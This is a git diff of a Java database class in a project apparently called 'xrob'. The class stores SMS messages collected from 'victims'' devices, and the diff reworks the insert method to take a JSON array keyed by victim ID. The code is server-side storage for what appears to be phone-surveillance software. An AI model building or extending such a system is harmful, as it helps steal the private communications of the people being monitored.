@@ -1,6 +1,7 @@
 package com.theah64.xrob.api.database.tables;
 
 
+import com.sun.istack.internal.Nullable;
 import com.theah64.xrob.api.database.Connection;
 import com.theah64.xrob.api.models.Message;
 import org.json.JSONArray;
@@ -17,12 +18,12 @@ import java.util.List;
  */
 public class Messages extends BaseTable<Message> {
 
-    private static final String KEY_TYPE_INBOX = "inbox";
-    private static final String KEY_TYPE_OUTBOX = "outbox";
-    private static final String COLUMN_PHONE = "phone";
     private static final String COLUMN_CONTENT = "content";
-    private static final String COLUMN_DELIVERED_AT = "delivered_at";
+    private static final String COLUMN_DELIVERY_TIME = "delivery_time";
     public static final String COLUMN_VICTIM_ID = "victim_id";
+    private static final String COLUMN_ANDROID_CONTACT_ID = "android_contact_id";
+    private static final String COLUMN_TYPE = "_type";
+    private static final String COLUMN_FROM = "_from";
     private static Messages instance = new Messages();
 
     public Messages() {
@@ -33,22 +34,12 @@ public class Messages extends BaseTable<Message> {
         return instance;
     }
 
-    /**
-     * To add new message to the database.
-     *
-     * @param victimId
-     * @param jOb
-     * @return
-     */
+
     @Override
-    public boolean add(final String victimId, JSONObject jOb) {
+    public void addv2(@Nullable String victimId, JSONArray jaArr) throws RuntimeException, JSONException {
 
-        //TODO: need to modify
-
-        boolean isAdded = true;
-
-        final String existenceQuery = "SELECT id FROM messages WHERE phone = ? AND content = ? AND delivered_at = ? AND _type = ? LIMIT 1";
-        final String addQuery = "INSERT INTO messages (victim_id,phone,content,_type,delivered_at) VALUES (?,?,?,?,?);";
+        final String existenceQuery = "SELECT id FROM messages WHERE _from = ? AND content = ? AND delivery_time = ? AND _type = ? AND victim_id = ? LIMIT 1";
+        final String addQuery = "INSERT INTO messages (victim_id,android_message_id,_from,content,_type,delivery_time) VALUES (?,?,?,?,?,?);";
 
         final java.sql.Connection con = Connection.getConnection();
 
@@ -56,53 +47,44 @@ public class Messages extends BaseTable<Message> {
             final PreparedStatement addPs = con.prepareStatement(addQuery);
             final PreparedStatement existencePs = con.prepareStatement(existenceQuery);
 
-            final String[] keyInboxOutbox = {KEY_TYPE_INBOX, KEY_TYPE_OUTBOX};
 
             //Saving inbox message
-            try {
 
-                //Looping through inbox and outbox node.
-                for (int i = 0; i < keyInboxOutbox.length; i++) {
+            for (int i = 0; i < jaArr.length(); i++) {
 
-                    if (jOb.has(keyInboxOutbox[i])) {
+                final JSONObject joMessage = jaArr.getJSONObject(i);
 
-                        final JSONArray jaInboxOutbox = jOb.getJSONArray(keyInboxOutbox[i]);
+                final String androidMessageId = joMessage.getString(COLUMN_ANDROID_CONTACT_ID);
+                final String content = joMessage.getString(COLUMN_CONTENT);
+                final String type = joMessage.getString(COLUMN_TYPE);
+                final String from = joMessage.getString(COLUMN_FROM);
+                final long deliveryTime = joMessage.getLong(COLUMN_DELIVERY_TIME);
 
-                        for (int j = 0; j < jaInboxOutbox.length(); j++) {
+                //Checking existence
+                existencePs.setString(1, from);
+                existencePs.setString(2, content);
+                existencePs.setLong(3, deliveryTime);
+                existencePs.setString(4, type);
+                existencePs.setString(5, victimId);
 
-                            final JSONObject jInMessage = jaInboxOutbox.getJSONObject(j);
-                            final String phone = jInMessage.getString(COLUMN_PHONE);
-                            final String content = jInMessage.getString(COLUMN_CONTENT);
-                            final long deliveryTimestamp = jInMessage.getLong(COLUMN_DELIVERED_AT);
+                final ResultSet rs = existencePs.executeQuery();
+                final boolean isExists = rs.first();
+                rs.close();
 
-                            //Checking existence
-                            existencePs.setString(1, phone);
-                            existencePs.setString(2, content);
-                            existencePs.setLong(3, deliveryTimestamp);
-                            existencePs.setString(4, keyInboxOutbox[i]);
+                if (!isExists) {
+                    addPs.setString(1, victimId);
+                    addPs.setString(2, androidMessageId);
+                    addPs.setString(3, from);
+                    addPs.setString(4, content);
+                    addPs.setString(5, type);
+                    addPs.setLong(6, deliveryTime);
 
-                            final ResultSet rs = existencePs.executeQuery();
-                            final boolean isExists = rs.first();
-                            rs.close();
-
-                            if (!isExists) {
-                                addPs.setString(1, victimId);
-                                addPs.setString(2, phone);
-                                addPs.setString(3, content);
-                                addPs.setString(4, keyInboxOutbox[i]);
-                                addPs.setLong(5, deliveryTimestamp);
-
-                                isAdded = addPs.executeUpdate() == 1 && isAdded;
-                            }
-                        }
-
+                    if (addPs.executeUpdate() != 1) {
+                        //Failed to add
+                        throw new RuntimeException("Failed to add " + joMessage);
                     }
-
                 }
 
-            } catch (JSONException e) {
-                e.printStackTrace();
-                isAdded = false;
             }
 
             addPs.close();
@@ -110,7 +92,6 @@ public class Messages extends BaseTable<Message> {
 
         } catch (SQLException e) {
             e.printStackTrace();
-            isAdded = false;
         } finally {
             try {
                 con.close();
@@ -119,7 +100,6 @@ public class Messages extends BaseTable<Message> {
             }
         }
 
-        return isAdded;
     }
 
     @Override
